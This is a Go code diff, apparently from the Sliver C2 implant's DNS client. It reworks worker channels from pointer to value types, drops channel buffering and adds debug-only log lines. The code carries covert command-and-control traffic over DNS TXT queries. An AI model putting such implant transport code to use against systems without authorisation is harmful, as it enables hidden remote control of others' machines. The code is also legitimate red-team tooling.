@@ -161,7 +161,7 @@ type DNSResult struct {
 type DNSWorker struct {
 	resolver DNSResolver
 	Metadata *ResolverMetadata
-	Queue    chan *DNSWork
+	Queue    chan DNSWork
 	Ctrl     chan struct{} // Tells the worker to exit
 }
 
@@ -172,10 +172,13 @@ func (w *DNSWorker) Start(id int) {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] starting worker #%d", id)
 		// {{end}}
-		var work *DNSWork
+		var work DNSWork
 		for {
 			select {
 			case work = <-w.Queue:
+				// {{if .Config.Debug}}
+				log.Printf("[dns] worker %d: %v", id, work)
+				// {{end}}
 			case <-w.Ctrl:
 				w.Ctrl <- struct{}{}
 				return
@@ -296,7 +299,7 @@ func (s *SliverDNSClient) SessionInit() error {
 		worker := &DNSWorker{
 			resolver: resolver,
 			Metadata: s.metadata[resolver.Address()],
-			Queue:    make(chan *DNSWork, queueBufSize),
+			Queue:    make(chan DNSWork),
 			Ctrl:     make(chan struct{}),
 		}
 		s.workerPool = append(s.workerPool, worker)
@@ -311,6 +314,10 @@ func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
 	if s.closed {
 		return ErrClosed
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] write envelope")
+	// {{end}}
+
 	envelopeData, err := proto.Marshal(envelope)
 	if err != nil {
 		return err
@@ -338,6 +345,9 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.closed {
 		return nil, ErrClosed
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] read envelope")
+	// {{end}}
 
 	resolver, meta := s.randomResolver()
 	pollMsg, err := s.pollMsg(meta)
@@ -433,9 +443,9 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope
 		if err != nil {
 			return nil, err
 		}
-		workerResult := make(chan *DNSResult, 1)
+		workerResult := make(chan *DNSResult)
 		worker := s.nextWorker()
-		worker.Queue <- &DNSWork{
+		worker.Queue <- DNSWork{
 			QueryType: dns.TypeTXT,
 			Domain:    subdata,
 			Results:   workerResult,
